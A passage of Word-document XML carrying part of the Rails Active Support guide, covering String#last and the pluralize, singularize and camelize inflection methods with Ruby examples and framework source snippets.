        <w:t>active_support/core_ext/string/access.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A123EDD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.8.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>last(limit = 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19026254" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>str.last(n)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is equivalent to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>str.from(-n)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> &gt; 0, and returns an empty string for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> == 0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B82F348" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/access.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39BBBE90" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.9 Inflections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728A76FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pluralize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="450408ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pluralize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the plural of its receiver:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2D860F8E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46D74257" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"table".pluralize     # =&gt; "tables"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B18E011" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"ruby".pluralize      # =&gt; "rubies"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1458CB90" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"equipment".pluralize # =&gt; "equipment"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B0F95ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As the previous example shows, Active Support knows some irregular plurals and uncountable nouns. Built-in rules can be extended in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/initializers/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. That file is generated by the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command and has instructions in comments.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FF768AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pluralize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can also take an optional </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>count</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> parameter. If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>count == 1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the singular form will be returned. For any other value of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>count</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the plural form will be returned:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="31221979" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0177D546" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"dude".pluralize(0) # =&gt; "dudes"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D3D8DDB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"dude".pluralize(1) # =&gt; "dude"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D7809EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"dude".pluralize(2) # =&gt; "dudes"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="04381658" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Record uses this method to compute the default table name that corresponds to a model:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7368"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4E2DA605" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76BDEA35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># active_record/base.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6ECEF4F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>undecorated_table_name(class_name = base_class.name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14981EAB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  table_name = class_name.to_s.demodulize.underscore</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2ADD3A7F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  table_name = table_name.pluralize if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>pluralize_table_names</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0419F2B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  table_name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7280B1B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4846FC09" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663FC686" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>singularize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37AFFA0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The inverse of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pluralize</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="574F3189" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75183908" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"tables".singularize    # =&gt; "table"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D50DB39" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"rubies".singularize    # =&gt; "ruby"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61F6E229" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"equipment".singularize # =&gt; "equipment"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="142C2B2A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Associations compute the name of the corresponding default associated class using this method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6408"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="77C4C8FA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D80AE4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># active_record/reflection.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CAB4A63" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>derive_class_name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62519B65" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class_name = name.to_s.camelize</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FC34CF4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class_name = class_name.singularize if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>collection?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="326C0F9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class_name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76A01EA6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="535F16A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F4096A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>camelize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A19E2B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>camelize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns its receiver in camel case:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="609DC3BA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E1AD9E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"product".camelize    # =&gt; "Product"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07263A78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"admin_user".camelize # =&gt; "AdminUser"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F6AAC9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>As a rule of thumb you can think of this method as the one that transforms paths into Ruby class or module names, where slashes separate namespaces:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2701C037" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A6D1D16" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1012685958"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"backoffice/session".camelize # =&gt; "Backoffice::Session"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0937D50D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example, Action Pack uses this method to load the class that provides a certain session store:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1DC2FE42" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3DF509BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># action_controller/metal/session_management.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C83BCCC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>session_store=(store)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64EEEB33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>store == :active_record_store</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CC1DE91" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    self.session_store = ActiveRecord::SessionStore</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74842EC0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E025FEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @@session_store</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= store.is_a?(Symbol) ?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C2701C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      ActionDispatch::Session.const_get(store.to_s.camelize) :</w:t>
            </w:r>
          </w:p>
